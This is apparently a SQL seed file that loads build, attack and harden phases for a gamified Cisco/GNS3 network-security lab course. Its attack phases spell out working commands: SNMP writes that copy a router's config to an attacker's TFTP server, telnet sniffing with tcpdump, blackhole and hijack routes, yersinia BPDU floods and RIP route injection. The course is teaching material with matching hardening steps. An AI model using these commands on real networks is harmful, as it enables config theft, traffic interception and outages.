<div class="mission">
<span class="tag">✔ LAB COMPLETE</span>
<h3>STP Sabotage — cleared</h3>
<p>You built a loop, let STP tame it, then walked in and crowned yourself root bridge with a laptop that isn''t even a switch. Then you took the crown back on purpose — explicit root election, BPDU Guard on every host port, Root Guard on the links that matter.</p>
<p><strong>Total: 2900 XP</strong> · Next target: <code>DTP &amp; VTP</code>, where trusting the wrong switch can delete every VLAN on the network in one message.</p>
</div>
', is_pro_only=FALSE
WHERE lab_id=2 AND phase='harden';
UPDATE lab_phases SET title='WLC Hardening', content='
<b>Step 1</b> — HTTPS only, disable HTTP. <b>Step 2</b> — Strong WLC admin credentials. <b>Step 3</b> — CAPWAP DTLS encryption. ', is_pro_only=TRUE
WHERE lab_id=42 AND phase='harden';
UPDATE lab_phases SET title='NETCONF Security', content='
<b>Step 1</b> — SSH key auth only for NETCONF. <b>Step 2</b> — ACL restrict NETCONF access to management IPs. <b>Step 3</b> — Audit log NETCONF changes. ', is_pro_only=TRUE
WHERE lab_id=44 AND phase='harden';
UPDATE lab_phases SET title='Automation Security', content='
<b>Step 1</b> — Ansible Vault for credentials: <code>ansible-vault encrypt group_vars/all.yml</code>. <b>Step 2</b> — Signed git commits for playbooks. <b>Step 3</b> — State file in secure backend (S3 with encryption). ', is_pro_only=TRUE
WHERE lab_id=45 AND phase='harden';
UPDATE lab_phases SET title='Exploit the CLI', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Break the network through the command line</h3><p>CLI mistakes ARE security vulnerabilities. Three attack vectors: (1) unauthorised config changes via default credentials, (2) command injection through poorly filtered SNMP/HTTP management interfaces, (3) session hijacking via telnet sniffing. Each of these starts with someone typing the wrong thing — or someone else typing on their behalf.</p></div>

<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ Default creds · command injection · SNMP injection</span></div>

## Attack 1 — Default credentials

On R1 (no password set yet), Kali connects via SSH:
```
ssh cisco@192.168.1.1
```

If no `login local` is configured, the user gets in with any password — or without one. Once in:
```
enable
show running-config
```

They now have the full config.

<div class="callout warn"><p><strong>Lesson:</strong> Every device ships with defaults. <code>cisco/cisco</code>, <code>admin/admin</code>, or no password at all. Always set credentials on Day 0.</p></div>

## Attack 2 — SNMP command injection

If SNMP write access is enabled (read-write community string), an attacker can execute config changes:
```
snmpset -v2c -c private 192.168.1.1 1.3.6.1.4.1.9.9.96.1.1.1.1.2.111 i 1
snmpset -v2c -c private 192.168.1.1 1.3.6.1.4.1.9.9.96.1.1.1.1.3.111 a ''192.168.1.200''
snmpset -v2c -c private 192.168.1.1 1.3.6.1.4.1.9.9.96.1.1.1.1.4.111 s ''copy running-config tftp://192.168.1.100/config.txt''
```

The attacker just copied R1''s config to their TFTP server — without logging into the CLI.

## Attack 3 — Telnet sniffing (from Lab 11)

If Telnet is enabled on R1, Kali captures the session:
```
sudo tcpdump -i eth0 -nn -X port 23
```

Wait for an admin to telnet in. The password and every command appear in plain text.

<div class="achievement"><span class="medal">⌨️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">CLI Hijacker — you stole configs through three CLI-side channels</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=18 AND phase='attack';
UPDATE lab_phases SET title='Harden QoS', content='
<b>Step 1</b> — Trust boundary: <code>int gi0/0</code> → <code>mls qos trust cos</code> only on uplink ports. <b>Step 2</b> — Police rogue EF: <code>police 512000 8000 exceed-action drop</code>. <b>Step 3</b> — Re-mark untrusted traffic: <code>set dscp 0</code> on access ports. ', is_pro_only=TRUE
WHERE lab_id=35 AND phase='harden';
UPDATE lab_phases SET title='Rogue DHCP Server', content='
<b>Attack:</b> Yersinia DHCP starvation + rogue dhcpd. Full Lab 08 Attack phase. ', is_pro_only=TRUE
WHERE lab_id=37 AND phase='attack';
UPDATE lab_phases SET title='DAI Basics', content='
<b>Standalone:</b> <code>ip arp inspection vlan 1</code> + <code>int gi0/24</code> → <code>ip arp inspection trust</code>. Full Lab 08 Harden. ', is_pro_only=FALSE
WHERE lab_id=38 AND phase='build';
UPDATE lab_phases SET title='Cable the Physical Layer', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Wire it right or it won''t work at all</h3><p>Ethernet cables look identical but serve different purposes: straight-through connects unlike devices (PC→switch), crossover connects like devices (switch→switch), and rollover connects to a console port for management. Using the wrong cable type is the most common physical-layer mistake — and the easiest to fix once you know the difference.</p></div>

<div class="stats"><span class="chip xp">✦ 200 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ Straight-through · Crossover · Rollover · MDIX · Pinout</span></div>

## The topology

| Device | Role | Connection |
|---|---|---|
| SW1–SW2 | Two switches | Initially cabled wrong |
| PC1–PC2 | End hosts | Straight-through to SW1 |
| R1 | Router | Console via rollover |
| KALI | Observer | Connected to SW2 |

## Objectives

<ul class="tool-objectives">
<li>Identify the three cable types and when to use each</li>
<li>Cable a switch-to-switch link with the wrong cable — observe failure</li>
<li>Fix the link with auto-MDIX or a crossover cable</li>
<li>Access the console port with a rollover cable</li>
</ul>

## Step 1 — Identify cable types

| Cable | Wiring | Use |
|---|---|---|
| Straight-through | Both ends identical (T568A/T568B) | PC ↔ Switch, Router ↔ Switch |
| Crossover | Transmit/receive swapped | Switch ↔ Switch, PC ↔ PC |
| Rollover | Fully reversed | Console port (RJ-45 to DB9 or USB) |

## Step 2 — Wrong cable test

Cable SW1↔SW2 with a **straight-through** cable (the wrong type). On SW1:
```
show interfaces gi0/24
```

The interface status shows `up/down` — Layer 1 is active but no keepalives are received. The link doesn''t establish because both switches are transmitting on the same pins.

## Step 3 — Fix with auto-MDIX

Modern switches detect and correct cable type automatically. Enable it:
```
configure terminal
interface gi0/24
 mdix auto
end
```

The link comes up. Check:
```
show interfaces gi0/24 | include Media
```

Auto-MDIX is now enabled. The switch internally crossed the transmit/receive pair.

## Step 4 — Console access

Connect a rollover cable from your host (KALI) to R1''s console port:
```
sudo screen /dev/ttyUSB0 9600
```

Press Enter. You''re at R1''s CLI through the console — no IP configuration needed.

<div class="callout info"><p><strong>GNS3 note:</strong> In GNS3, console access is virtual (right-click → Console). The physical cable exercise helps you recognise the real-world equivalent.</p></div>

<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Cable Master — you know the wire, the pinout, and the fix</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=16 AND phase='build';
UPDATE lab_phases SET title='Build a WAN Link', content='
<b>Topology:</b> R1 (London) ↔ R2 (Paris) with serial HDLC link. <b>Step 1</b> — HDLC: <code>int s0/0</code> → <code>encapsulation hdlc</code> → <code>ip address 10.0.0.1/30</code>. <b>Step 2</b> — Same on R2. <b>Step 3</b> — PPP alternative: <code>encapsulation ppp</code> (adds auth/LCP). <b>Step 4</b> — Verify: <code>show interfaces serial</code>. ', is_pro_only=FALSE
WHERE lab_id=39 AND phase='build';
UPDATE lab_phases SET title='WAN Eavesdropping', content='
<b>Attack 1 — Serial tap:</b> If you have physical access to the serial cable, tap the line. <b>Attack 2 — PPP CHAP relay:</b> MITM the PPP authentication handshake to capture CHAP hashes. <b>Attack 3 — WAN DoS:</b> Flood the serial interface — serial links are low-bandwidth (1.5Mbps T1). <code>iperf -c 10.0.0.2 -b 10M</code>. ', is_pro_only=TRUE
WHERE lab_id=39 AND phase='attack';
UPDATE lab_phases SET title='Survive the Command Line', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Master the CLI in 20 commands</h3><p>Cisco IOS is the operating system of every router and switch, and the only way to talk to it is through the Command Line Interface. Three modes: User EXEC (>), Privileged EXEC (#), and Global Configuration (config)#). Every config change happens in a specific mode, and a wrong keystroke can take down a production network. This lab teaches you the 20 commands you''ll use daily.</p></div>

<div class="stats"><span class="chip xp">✦ 250 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~25 min</span><span class="chip loot">⬡ CLI modes · show commands · configuration · piping · history</span></div>

## The topology

| Device | Role |
|---|---|
| R1 | Lab router |
| SW1 | Lab switch |
| KALI | Console access via telnet/SSH |

Just one router and one switch. The focus is purely on the CLI.

## Objectives

<ul class="tool-objectives">
<li>Navigate the three IOS modes</li>
<li>Use show commands to inspect device state</li>
<li>Configure interfaces, hostname, passwords</li>
<li>Use shortcuts and command history</li>
</ul>

## Step 1 — Navigate modes

Access R1 via console (GNS3 right-click → Console):
```
R1>                          ! User EXEC mode — limited commands
R1>enable                    ! Enter Privileged EXEC
R1#                          ! Privileged EXEC — full show commands
R1#configure terminal        ! Enter Global Config
R1(config)#                  ! Global Configuration
```

To move back:
```
R1(config)#exit              ! Back one level
R1(config)#end               ! Back to Privileged EXEC directly
R1#disable                   ! Back to User EXEC
R1>logout                    ! Disconnect
```

## Step 2 — Essential show commands

```
show running-config          ! Active config
show startup-config          ! Saved config
show interfaces              ! All interfaces
show ip interface brief     ! IP summary
show arp                     ! ARP table
show mac address-table       ! CAM table
show vlan brief              ! VLANs
show ip route                ! Routing table
show cdp neighbors           ! Directly connected devices
show version                 ! IOS version, uptime, hardware
```

## Step 3 — The help system

```
?                            ! List all available commands
show ?                       ! Subcommands of "show"
show ip ?                    ! Subcommands of "show ip"
show ip int ?                ! Parameters for "show ip int"
sh ip int bri                ! Tab-complete: Ctrl+P (previous), Ctrl+N (next)
```

The `?` is context-sensitive. In config mode it shows config commands. In exec mode it shows exec commands.

## Step 4 — Save and verify

```
write memory                 ! Save to startup-config
copy running-config startup-config
reload in 5                  ! Reload in 5 minutes (cancel with "reload cancel")
```

<div class="callout tip"><p><strong>Shortcuts:</strong> <code>sh run</code> = <code>show running-config</code>, <code>sh ip int bri</code> = <code>show ip interface brief</code>, <code>conf t</code> = <code>configure terminal</code>, <code>Ctrl+A</code> = beginning of line, <code>Ctrl+E</code> = end of line, <code>Ctrl+W</code> = delete word, <code>Ctrl+U</code> = delete line.</p></div>

<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">CLI Commando — twenty commands, three modes, one working config</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=18 AND phase='build';
UPDATE lab_phases SET title='Build an IPv4 Addressing Scheme', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Design and deploy IP addressing</h3><p>Every device on a network needs a unique IP address, a subnet mask, and a default gateway. Without a well-planned addressing scheme, you''ll run out of addresses, create overlapping subnets, or — worst case — silently route traffic to the wrong network. In this lab you plan and deploy a multi-subnet IPv4 addressing scheme with classful, classless, and private addressing.</p></div>

<div class="stats"><span class="chip xp">✦ 250 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~25 min</span><span class="chip loot">⬡ IPv4 · subnet mask · CIDR · private/public · gateway</span></div>

## The topology

| Segment | Subnet | Devices |
|---|---|---|
| LAN A | 192.168.10.0/24 | PC1 (10.10), PC2 (10.20), gateway R1 (10.1) |
| LAN B | 172.16.20.0/24 | PC3 (20.10), gateway R1 (20.1) |
| WAN | 10.0.0.0/30 | R1 (0.1), R2 (0.2) |

## Objectives

<ul class="tool-objectives">
<li>Design a subnet plan for three segments</li>
<li>Configure IP addresses on all interfaces</li>
<li>Verify reachability between segments through the router</li>
</ul>

## Step 1 — Interface addressing

On R1:
```
configure terminal
interface gi0/0
 ip address 192.168.10.1 255.255.255.0
 no shutdown
interface gi0/1
 ip address 172.16.20.1 255.255.255.0
 no shutdown
interface gi0/2
 ip address 10.0.0.1 255.255.255.252
 no shutdown
end
```

## Step 2 — Host addressing

On PC1 (VPCS):
```
ip 192.168.10.10 255.255.255.0 192.168.10.1
```

On PC2:
```
ip 192.168.10.20 255.255.255.0 192.168.10.1
```

On PC3:
```
ip 172.16.20.10 255.255.255.0 172.16.20.1
```

## Step 3 — Verify

From PC1:
```
ping 192.168.10.20      ! Same subnet — works via switch
ping 172.16.20.10       ! Different subnet — works via R1
ping 10.0.0.2           ! WAN link — works via R1
```

On R1:
```
show ip interface brief
show ip route
```

R1 has three directly connected routes: one per subnet.

<div class="callout info"><p><strong>Private ranges:</strong> 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16. These are not routable on the internet — they''re for internal use only. NAT translates them to a public address when accessing the internet.</p></div>

<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Address Planner — three subnets, no overlapping, every device reachable</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=19 AND phase='build';
UPDATE lab_phases SET title='Configure Every Interface Type', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Master interface configuration modes</h3><p>Cisco interfaces come in many flavours: access ports (one VLAN), trunk ports (many VLANs), routed ports (Layer 3), loopback (virtual), SVI (switch virtual interface), and management interfaces. Each has a specific configuration syntax and purpose. Getting it wrong means no connectivity — and troubleshooting interface issues is 50% of a network engineer''s job.</p></div>

<div class="stats"><span class="chip xp">✦ 300 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~30 min</span><span class="chip loot">⬡ Access · Trunk · Routed · Loopback · SVI · Management</span></div>

## The topology

| Device | Interfaces | Role |
|---|---|---|
| SW1 | Gi0/1–3 (access), Gi0/24 (trunk) | L2 switch |
| R1 | Gi0/0 (routed), Lo0 (loopback) | Router |
| R2 | Gi0/0 (routed) | Second router |
| PC1–PC3 | Access ports | End hosts |

## Objectives

<ul class="tool-objectives">
<li>Configure access ports, trunk ports, and routed ports</li>
<li>Create a loopback interface and an SVI</li>
<li>Troubleshoot common interface issues (shutdown, no negotiation, wrong mode)</li>
</ul>

## Step 1 — Access and trunk ports

On SW1:
```
configure terminal
interface gi0/1
 description PC1-VLAN10
 switchport mode access
 switchport access vlan 10
!
interface gi0/2
 description PC2-VLAN20
 switchport mode access
 switchport access vlan 20
!
interface gi0/24
 description TRUNK-TO-R1
 switchport mode trunk
 switchport trunk allowed vlan 10,20
end
```

## Step 2 — SVI (Switch Virtual Interface)

On SW1 (L3 switch):
```
configure terminal
interface vlan 10
 ip address 192.168.10.1 255.255.255.0
 no shutdown
interface vlan 20
 ip address 192.168.20.1 255.255.255.0
 no shutdown
ip routing
end
```

The switch now routes between VLANs without an external router.

## Step 3 — Loopback interface

On R1:
```
configure terminal
interface loopback 0
 ip address 1.1.1.1 255.255.255.255
end
```

A loopback is virtual — it never goes down. Used for router ID, management, and testing.

## Step 4 — Verify

```
show interfaces description
show interfaces status
show vlan brief
show interfaces trunk
ping 1.1.1.1
```

<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Interface Guru — access, trunk, SVI, loopback — all configured</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=20 AND phase='build';
UPDATE lab_phases SET title='Poison the Route', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Blackhole, hijack, and loop the traffic</h3><p>Static routes are static — they don''t change unless someone changes them. But an attacker who gains CLI access, or exploits a misconfigured dynamic routing protocol, can add a route that: (1) sends traffic nowhere (blackhole), (2) sends traffic through the attacker (hijack), or (3) creates a routing loop between two routers.</p></div>

<div class="stats"><span class="chip xp">✦ 500 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~25 min</span><span class="chip loot">⬡ Route hijack · blackhole · routing loop · null0</span></div>

## Attack 1 — Blackhole route

An attacker with access to R1 adds:
```
configure terminal
ip route 192.168.3.0 255.255.255.0 null0
end
```

Now all traffic to 192.168.3.0/24 is sent to the null interface — silently dropped. PC1''s ping to PC3 stops working.

Verify:
```
show ip route 192.168.3.0
```
The route points to Null0.

## Attack 2 — Route hijack (MITM)

An attacker adds a route that points to an interface Kali controls:
```
configure terminal
ip route 192.168.3.0 255.255.255.0 10.0.0.3   ! Kali''s IP
end
```

Traffic to PC3 now goes through Kali first. Kali forwards it, but also captures every packet:
```
sudo tcpdump -i eth0 -nn
```

## Attack 3 — Routing loop

Two routers pointing to each other for the same subnet:
```
! On R1
ip route 192.168.3.0 255.255.255.0 10.0.0.2   ! R2

! On R2  
ip route 192.168.3.0 255.255.255.0 10.0.0.1   ! R1
```

Packets bounce between R1 and R2 until TTL expires. Traceroute shows the loop:
```
traceroute 192.168.3.10
```

The TTL increments past 30 and the traceroute entries repeat the same two routers.

<div class="callout warn"><p><strong>Routing loops are a network killer.</strong> They consume bandwidth and CPU. In production, a routing loop can take down an entire data centre. Always verify new static routes with <code>show ip route</code> before applying.</p></div>

<div class="achievement"><span class="medal">🕳️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Route Poisoner — you blackholed, hijacked, and looped traffic at will</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=21 AND phase='attack';
UPDATE lab_phases SET title='Secure the Routing Table', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Lock down the routing table</h3><p>Defenses: administrative distance for static route preference, distribute-lists to filter which routes are accepted, authentication for dynamic protocols, route summarisation to reduce attack surface.</p></div>

<div class="stats"><span class="chip xp">✦ 250 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ Admin distance · distribute-list · route auth · summarisation</span></div>

## Step 1 — Floating static routes

Static routes have AD 1 by default. Use a higher AD to make them backup routes:
```
configure terminal
ip route 192.168.3.0 255.255.255.0 10.0.0.2 200
end
```

AD 200 means this route is only used if no other route (with lower AD) exists.

## Step 2 — Remove null/unwanted routes

```
configure terminal
no ip route 192.168.3.0 255.255.255.0 null0
no ip route 192.168.3.0 255.255.255.0 10.0.0.3
end
```

Clean routing table.

## Step 3 — Route filtering with distribute-list

If using a dynamic protocol, use distribute-lists to only accept specific routes:
```
configure terminal
router rip
 distribute-list 10 in
!
access-list 10 permit 192.168.0.0 0.0.255.255
access-list 10 deny any
end
```

Only routes matching 192.168.x.x are accepted. Everything else is dropped.

<div class="achievement"><span class="medal">🛡️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Route Guardian — the routing table only contains routes you authorised</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=21 AND phase='harden';
UPDATE lab_phases SET title='Prevent Rapid Failover', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Delay RSTP convergence with BPDU flood</h3><p>RSTP relies on BPDUs to detect link failures. Flood fake BPDUs to confuse the convergence process and force the network back into 802.1D listen/learn timers.</p></div>
<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Advanced</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ BPDU flood · RSTP downgrade · max age</span></div>
<b>Attack 1 — BPDU flood with yersinia:</b> <code>yersinia stp -attack 2 -interface eth0</code> floods TCNs, forcing switches into listening/learning. <b>Attack 2 — Forge a superior BPDU:</b> Craft a BPDU with priority 0 making Kali the root: <code>yersinia stp -attack 1</code>. <b>Attack 3 — Max-age manipulation:</b> Send BPDUs with max-age = 40 (default 20). Switches hold stale topology information longer, delaying convergence when a real failure occurs.
<div class="achievement"><span class="medal">⚡</span><span class="txt">Achievement: RSTP Breaker</span></div>
', is_pro_only=TRUE
WHERE lab_id=25 AND phase='attack';
UPDATE lab_phases SET title='Plan Variable-Length Subnets', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Slice efficiently — different sizes for different needs</h3><p>Variable-Length Subnet Masking (VLSM) lets you give each subnet exactly the number of addresses it needs — no waste. A LAN with 50 hosts gets a /26 (62 usable). A WAN link with 2 hosts gets a /30 (2 usable). The trick: start with the LARGEST subnet and work down to the smallest, so no ranges overlap.</p></div>

<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~30 min</span><span class="chip loot">⬡ VLSM · hierarchical addressing · route summarisation</span></div>

## The topology

| Subnet | Hosts Needed | CIDR | Usable | Network |
|---|---|---|---|---|
| LAN A | 50 hosts | /26 | 62 | 192.168.1.0/26 |
| LAN B | 25 hosts | /27 | 30 | 192.168.1.64/27 |
| LAN C | 10 hosts | /28 | 14 | 192.168.1.96/28 |
| WAN 1 | 2 hosts | /30 | 2 | 192.168.1.112/30 |
| WAN 2 | 2 hosts | /30 | 2 | 192.168.1.116/30 |

Total used: 120 addresses out of 256 — 47% utilisation vs 25% with FLSM.

## Objectives

<ul class="tool-objectives">
<li>Design a VLSM scheme starting with the largest subnet</li>
<li>Configure routers with the appropriate variable-length masks</li>
<li>Verify no overlapping subnets exist</li>
</ul>

## Step 1 — Design VLSM (largest first)

Start with 192.168.1.0/24.

1. LAN A needs 50 → /26 (64 block) → 192.168.1.0/26 (0–63)
2. LAN B needs 25 → /27 (32 block) → 192.168.1.64/27 (64–95)
3. LAN C needs 10 → /28 (16 block) → 192.168.1.96/28 (96–111)
4. WAN 1 needs 2 → /30 (4 block) → 192.168.1.112/30 (112–115)
5. WAN 2 needs 2 → /30 (4 block) → 192.168.1.116/30 (116–119)

## Step 2 — Configure

On R1 (LAN A + WAN 1):
```
interface gi0/0
 ip address 192.168.1.1 255.255.255.192      ! /26
interface gi0/1
 ip address 192.168.1.113 255.255.255.252    ! /30
```

On PC1:
```
ip 192.168.1.10 255.255.255.192 192.168.1.1
```

On R2 (LAN B + WAN 1 + WAN 2):
```
interface gi0/0
 ip address 192.168.1.65 255.255.255.224     ! /27
interface gi0/1
 ip address 192.168.1.114 255.255.255.252    ! /30
interface gi0/2
 ip address 192.168.1.117 255.255.255.252    ! /30
```

On PC2:
```
ip 192.168.1.66 255.255.255.224 192.168.1.65
```

## Step 3 — Route summarisation

The beauty of VLSM: you can summarise. Instead of 5 routes, R3 needs only one:
```
ip route 192.168.1.0 255.255.255.128 192.168.1.118
```

All /26, /27, /28, and /30 subnets fall within 192.168.1.0/25 (192.168.1.0–127).

<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">VLSM Architect — variable subnets, zero waste, clean summarisation</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=23 AND phase='build';
UPDATE lab_phases SET title='Harden Rapid PVST+', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>BPDU Guard + Root Guard + Loop Guard</h3><p>Same defenses as STP: BPDU Guard on edge ports, Root Guard on designated ports, Loop Guard on blocked ports. RSTP is faster but no more secure.</p></div>
<div class="stats"><span class="chip xp">✦ 250 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ BPDU guard · root guard · loop guard</span></div>
<b>Step 1</b> — BPDU Guard globally: <code>spanning-tree portfast bpduguard default</code>. <b>Step 2</b> — Root Guard on access ports: <code>int gi0/1</code> → <code>spanning-tree guard root</code>. <b>Step 3</b> — Loop Guard on blocked ports: <code>spanning-tree loopguard default</code>. <b>Step 4</b> — Re-run attack: BPDU flood triggers errdisable instead of topology change.
<div class="achievement"><span class="medal">🛡️</span><span class="txt">Achievement: RSTP Warden</span></div>
', is_pro_only=TRUE
WHERE lab_id=25 AND phase='harden';
UPDATE lab_phases SET title='PPP Authentication', content='
<b>Step 1</b> — PPP CHAP: <code>username R2 password NetBreaker</code> → <code>int s0/0</code> → <code>ppp authentication chap</code>. <b>Step 2</b> — Same on R2 with R1''s username. <b>Step 3</b> — Verify: <code>show interfaces s0/0 | include PPP</code>. ', is_pro_only=TRUE
WHERE lab_id=39 AND phase='harden';
UPDATE lab_phases SET title='Join a VTP Domain', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Propagate VLANs across the network</h3><p>VTP (VLAN Trunking Protocol) distributes VLAN information across switches. Create a VLAN on one switch and every switch in the domain learns it. DTP (Dynamic Trunking Protocol) negotiates trunk mode automatically. Both are convenience features — and both are security liabilities when left enabled.</p></div>
<div class="stats"><span class="chip xp">✦ 300 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ VTP · VTP domain · VTP server/client · DTP · dynamic trunk</span></div>
<b>Topology:</b> SW1 (VTP server), SW2 (client), SW3 (transparent). Trunks between them. PC1–3 on VLANs.
<br/><b>Step 1</b> — VTP config on SW1: <code>vtp domain NETBREAKER</code>, <code>vtp mode server</code>, <code>vlan 10</code>, <code>name SALES</code>, <code>vlan 20</code>, <code>name ENG</code>.
<br/><b>Step 2</b> — SW2 client: <code>vtp domain NETBREAKER</code>, <code>vtp mode client</code>. SW2 learns VLANs 10 and 20 automatically.
<br/><b>Step 3</b> — SW3 transparent: <code>vtp mode transparent</code>. It forwards VTP updates but doesn''t learn or advertise.
<br/><b>Step 4</b> — Verify: <code>show vtp status</code>, <code>show vlan brief</code>. SW2 shows VLANs 10 and 20 without manual config.
<div class="achievement"><span class="medal">🏗️</span><span class="txt">Achievement: VTP Apprentice</span></div>
', is_pro_only=FALSE
WHERE lab_id=24 AND phase='build';
UPDATE lab_phases SET title='Build Rapid Convergence', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>RSTP converges in seconds, not seconds</h3><p>Rapid PVST+ (RSTP) replaces the original 802.1D STP. Instead of 50 seconds for failover, RSTP converges in under 6 seconds by using edge ports and link types.</p></div>
<div class="stats"><span class="chip xp">✦ 250 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ RSTP · Rapid PVST+ · edge port · link type</span></div>
<b>Topology:</b> SW1–SW2–SW3 triangle with 3 PCs. <b>Step 1</b> — Enable RSTP globally: <code>spanning-tree mode rapid-pvst</code> on all switches. <b>Step 2</b> — Set root: <code>spanning-tree vlan 1 root primary</code> on SW1. <b>Step 3</b> — Configure edge ports: <code>int gi0/1</code> → <code>spanning-tree portfast</code>. <b>Step 4</b> — Verify: <code>show spanning-tree</code> shows RSTP mode and edge port status.
<div class="achievement"><span class="medal">🏗️</span><span class="txt">Achievement: Rapid Response</span></div>
', is_pro_only=FALSE
WHERE lab_id=25 AND phase='build';
UPDATE lab_phases SET title='Escape the VM', content='
<b>Attack 1 — Virtual switch DoS:</b> Flood the hypervisor''s virtual switch — affects all VMs on the same host. <b>Attack 2 — VLAN jumping:</b> DTP spoof from within a VM to escape to other tenants'' VLANs. <b>Attack 3 — Resource starvation:</b> Saturate the virtual NIC''s queue to starve other VMs. ', is_pro_only=TRUE
WHERE lab_id=40 AND phase='attack';
UPDATE lab_phases SET title='Configure a WLAN', content='
<b>In GNS3:</b> Simulate with AP + switch. <b>Step 1</b> — SSID, WPA2, channel, power. <b>Step 2</b> — Connect a wireless client. <b>Step 3</b> — Verify: <code>show dot11 associations</code>. ', is_pro_only=FALSE
WHERE lab_id=41 AND phase='build';
UPDATE lab_phases SET title='WPA3 and Management Frame Protection', content='
<b>Step 1</b> — Use WPA3 (SAE) if supported. <b>Step 2</b> — Enable MFP (Management Frame Protection). <b>Step 3</b> — Deauth attacks fail with MFP. ', is_pro_only=TRUE
WHERE lab_id=41 AND phase='harden';
UPDATE lab_phases SET title='Run a Dynamic Routing Protocol', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Routers talk to each other</h3><p>Dynamic routing protocols (RIP, EIGRP, OSPF) let routers share routes automatically. You configure the protocol once and it adapts when the topology changes. RIP is the simplest — distance vector, hop-count metric.</p></div>
<div class="stats"><span class="chip xp">✦ 250 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ RIP · distance vector · route advertisement</span></div>
<b>Topology:</b> R1–R2–R3 chain with PCs behind each. <b>Step 1</b> — RIP on R1: <code>router rip</code> → <code>version 2</code> → <code>network 10.0.0.0</code> → <code>network 192.168.1.0</code> → <code>no auto-summary</code>. Repeat on R2 and R3. <b>Step 2</b> — Verify: <code>show ip route rip</code> shows all routes. <b>Step 3</b> — Unplug a link: routes update in seconds (RIP timer: 30s update, 180s hold-down).
<div class="achievement"><span class="medal">🏗️</span><span class="txt">Achievement: Dynamic Driver</span></div>
', is_pro_only=FALSE
WHERE lab_id=27 AND phase='build';
UPDATE lab_phases SET title='Pillage the Routing Table', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Inject fake routes via RIP</h3><p>RIPv2 has no authentication by default. Any device can send RIP updates and inject routes. An attacker with 0.0.0.0/0 with low metric diverts all traffic.</p></div>
<div class="stats"><span class="chip xp">✦ 500 XP</span><span class="chip diff">◆ Advanced</span><span class="chip time">◷ ~25 min</span><span class="chip loot">⬡ RIP injection · route hijack · poison reverse</span></div>
<b>Attack 1 — RIP injection from Kali:</b> Install Quagga/FRR: <code>sudo apt install frr</code>. Configure in /etc/frr/frr.conf: <code>router rip</code> → <code>network 10.0.0.0/30</code> → <code>redistribute static</code> → <code>ip route 0.0.0.0/0 null0</code>. Kali announces a default route. R1 and R2 learn it. Traffic to the internet goes through Kali. <b>Attack 2 — Route flapping:</b> Withdraw and re-advertise a route rapidly, causing CPU spikes on all routers. <b>Attack 3 — Route poisoning:</b> Advertise 192.168.2.0/24 with metric 16 (unreachable in RIP). R1 thinks PC2''s subnet is down even though it''s perfectly fine.
<div class="achievement"><span class="medal">💉</span><span class="txt">Achievement: Route Injector</span></div>
', is_pro_only=TRUE
WHERE lab_id=27 AND phase='attack';
UPDATE lab_phases SET title='WLC Exploitation', content='
<b>Attack 1 — WLC HTTP interface:</b> If HTTP enabled, default creds grant full control. <b>Attack 2 — AP de-registration:</b> Spoof a de-registration message to disconnect APs. <b>Attack 3 — CAPWAP flood:</b> Flood the WLC with CAPWAP discovery requests. ', is_pro_only=TRUE
WHERE lab_id=42 AND phase='attack';
UPDATE lab_phases SET title='Push a Config via API', content='
<b>Step 1</b> — Enable RESTCONF: <code>restconf</code> → <code>ip http secure-server</code>. <b>Step 2</b> — From Kali: <code>curl -k -X GET https://192.168.1.1/restconf/data/Cisco-IOS-XE-native:native/hostname -u admin:pass</code>. ', is_pro_only=FALSE
WHERE lab_id=43 AND phase='build';
